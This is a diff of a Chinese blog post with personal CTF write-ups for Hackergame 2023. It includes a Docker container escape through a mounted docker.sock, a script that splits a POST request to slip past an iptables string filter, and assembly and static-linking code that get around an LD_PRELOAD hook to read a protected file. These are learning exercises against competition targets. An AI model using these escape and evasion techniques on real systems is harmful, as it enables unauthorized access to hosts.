@@ -1,7 +1,7 @@
 ---
 title: Hackergame 2023 总结 + 个人题解
 date: 2023-11-05 15:22:07
-updated: 2023-11-17 12:57:00
+updated: 2024-02-25 09:37:10
 tags: [CTF]
 categories: [其他]
 ---
@@ -514,7 +514,7 @@ GET /\r\n\r\n
 
 本人通过参考文章 [技术干货 | Docker 容器逃逸案例汇集](https://zhuanlan.zhihu.com/p/191373337)，猜测可能宿主 Docker 的 sock 及本体映射进去了，便进行了以下操作。
 
-```bash
+```shell
 docker -H unix:///var/run/docker.sock run -it -v /:/host alpine /bin/ash  # 调用宿主机的 docker 开启新的容器，并挂在根目录至 /host，并运行 ash
 cat /host`readlink -f /host/flag`  # 获取 flag
 ```
@@ -567,6 +567,233 @@ with open("result.txt", "w") as fp:
 
 ~~（随便写的就不要奢求什么啦（x）~~
 
-# 未完待续
+## 🪐 流式星球
 
-心血来潮写了一部分，然后有点累了，后面再更x
+这道题通过代码是可以发现处理的视频是经过 `cv2` 和 `numpy` 处理，以类似于 RAW 且不压缩地输出到新文件，但是数据最后部分数据（可能是 [0, 100] 范围内的任意一个数）被直接裁切掉了，但由于数据是 RAW 形式存储的，即使后面被裁切了，也不影响前面的内容解析。
+
+其中视频的长宽是无法知道的，只能慢慢去试。另外由于数据裁切，需要对最后被裁切的不完整数据进行处理。以下是我写的 Python 脚本。
+
+```python
+import numpy as np
+import cv2
+
+arr = np.fromfile("video.bin", dtype=(np.uint8, np.uint8))
+frame = 110
+height = 759
+width = 427
+arr = arr[:(frame * height * width * 3)]
+arr = arr.reshape((frame, height, width, 3), order="C")
+for i in range(frame):
+    cv2.imshow("video", arr[i])
+    cv2.waitKey(100)
+```
+
+## 🪐 低带宽星球
+
+### 小试牛刀
+
+> 压缩至 2KiB (2048 字节) 及以下，获得 flag1
+
+什么？图片压缩？还得看我 VP9 / AV1 压缩！直接上 WebP 压缩
+
+```shell
+ffmpeg -i /home/ricky/Downloads/image.png -lossless 1 /home/ricky/Downloads/image.webp
+```
+
+压缩出来 170B，完事！
+
+### 极致压缩
+
+这题没解出来x
+
+> 压缩至 50 字节及以下，获得 flag2
+
+看到这个，我还在尝试 VP9 / AV1 压缩加上各种优化参数，但始终无法实现 50 bytes 以下（甚至还幻想转换成 SVG，但实际更大了）
+
+实际上过程中还搜索到了 JPEG XL 这个东西，但是脑子里想着 JPEG 是什么古老的东西，肯定不是他（然后看官方题解后：草！）
+
+## 💻 Komm, süsser Flagge
+
+### 我的 POST
+
+首先看到第一条规则
+
+```shell
+-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset
+```
+
+可以看到是通过匹配**包**里是否存在 `POST` 来过滤包。
+
+所以重点在于让 POST 这串东西强制分包传输，虽然说想过通过降低 MTU 和 MSS 来控制分包，但发现毫无成果。
+
+然后我在猜想能不能直接通过 `socket.send` 分开两次发来实现分包，然后实践了一下确实可以。
+
+```python
+import socket
+import time
+
+addr, port = input("input the host (addr:port): ").split(":")
+token = input("input your token: ")
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((addr, int(port)))
+client.send(b"P")
+time.sleep(1)
+client.send(b"OST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: " + str(len(token)).encode() + b"\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" + token.encode() + b"\r\n\r\n")
+print(client.recv(4096))
+```
+
+### 我的 P
+
+是非预期解啦，我拿第一题的代码拿到了。
+
+具体原因可以看 [官方题解说明](https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master/official/Komm%2C%20s%C3%BCsser%20Flagge#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3)。
+
+### 我的 GET
+
+没解出来。
+
+## 👨‍💻 为什么要打开 /flag 😡
+
+### LD_PRELOAD
+
+第一题 *LD_PRELOAD* 这名字已经提示了这题通过 `LD_PRELOAD` 进行干扰程序运行，即可以通过静态链接或者直接上 Assembly 绕过干扰。
+
+#### Assembly
+
+感谢 [Reading files the hard way - Part 2 (x86 asm, linux kernel)](https://fasterthanli.me/series/reading-files-the-hard-way/part-2)，代码参考了该文章。
+
+```nasm
+global _start
+
+section .data
+    path:   db  "/flag", 0
+
+
+section .text
+_start:
+    mov     rax, 2      ; "open"
+    mov     rdi, path   ;
+    xor     rsi, rsi    ; O_RDONLY
+    syscall
+
+    push    rax         ; push file descriptor onto stack
+    sub     rsp, 64     ; reserve 64 bytes of memory
+
+    xor     rax, rax    ; "read"
+    mov     rdi, [rsp+64]   ; file descriptor
+    mov     rsi, rsp    ; address of buffer
+    mov     rdx, 64     ; size of buffer
+    syscall
+
+    mov     rdx, rax    ; number of bytes
+    mov     rax, 1      ; "write"
+    mov     rdi, 1      ; file descriptor (stdout)
+    mov     rsi, rsp    ; address of buffer
+    syscall
+
+    mov     rax, 60     ; "exit"
+    xor     rdi, rdi    ; return code 0
+    syscall
+```
+
+#### 静态链接
+
+下面是随便写的代码。
+
+```c
+#include <stdio.h>
+
+int main() {
+    FILE *fp = fopen("/flag", "r");
+    char buffer[64];
+    fread(buffer, 64, 1, fp);
+    printf("%s", buffer);
+}
+```
+
+下面是编译命令。
+
+```shell
+gcc -static ld_preload.c -o ld_preload
+```
+
+### 都是 seccomp 的错
+
+挖，是 Rust！但没在意那条注释（虽然说看到了也不会解x）
+
+## 👨‍💻 异星歧途
+
+特意下了 Mindustry（在游戏里解题，蛮新颖的x）
+
+一开始我还以为真的是搁那随便试试就能试出来了，然后弄了半天没弄出什么来，直到后面发现了叫 **微型处理器** 和 **逻辑处理器** 的东西，打开发现一堆逻辑（x）
+
+不过最后一个确实得一个个试，试出来把整体通了就好了。
+
+### 第一个区域
+
+第一个可以推出来以下逻辑：
+
+从左到右，匹配上了 `0 1 0 1 1 0 1 0` 的一个，则整体为 *disabled* 状态，反之为 *enabled* 状态。
+
+用代码表示就是：
+
+```python
+enabled = not any(switch == target for switch, target in zip(switches, [0, 1, 0, 1, 1, 0, 1, 0]))
+```
+
+可以得出开关需要设置为 `1 0 1 0 0 1 0 1`。
+
+### 第二个区域
+
+第二个可以推出来以下逻辑：
+
+```python
+number += sw1 << 7
+number += sw2 << 6
+number += sw3 << 5
+number += sw4 << 4
+number += sw5 << 3
+number += sw6 << 2
+number += sw7 << 1
+number += sw8
+en = number in [i ** 2 for i in range(16)]
+enabled = sw1 and sw6 and en
+```
+
+可以发现令 `number` 结果符合 `[0, 1, 4, 9, 16, 25, 36, 49, 64, 81, 100, 121, 144, 169, 196, 225]` 其中任意一个结果且 sw1 和 sw6 处于启动状态都能使其启动。
+
+可以通过尝试组合，得出开关需要设置为 `1 1 0 0 0 1 0 0`（此时 number 结果为 `2^7 + 2^6 + 2^2 = 196`）。
+
+### 第三个区域
+
+此处逻辑十分简单：
+
+```python
+converyor1.enabled = switch1.enabled
+gate1.enabled = switch2.enabled
+reactor1.enabled = not switch3.enabled
+reactor2.enabled = not switch3.enabled
+conduit1.enabled = switch4.enabled
+conduit2.enabled = switch4.enabled
+mixer1.enabled = switch5.enabled
+extractor1.enabled = switch7.enabled
+meltdown2.enabled = switch7.enabled
+
+if switch8.enabled != switch9.enabled:
+    mixer1.enabled = False
+    conduit2.enabled = True
+    reactor1.enabled = True
+    reactor2.enabled = True
+    conveyor2.enabled = True
+    sleep(5)
+```
+
+经过**尝试**可以得到开关需要设置为 `1 0 0 0 1 1 1 0`。
+
+### 第四个区域
+
+基于**尝试**可以得到开关需要设置为 `0 1 1 1 0 1 1 1`。
+
+# 后记
+
+咕咕咕了三个月，终于把它更完了！
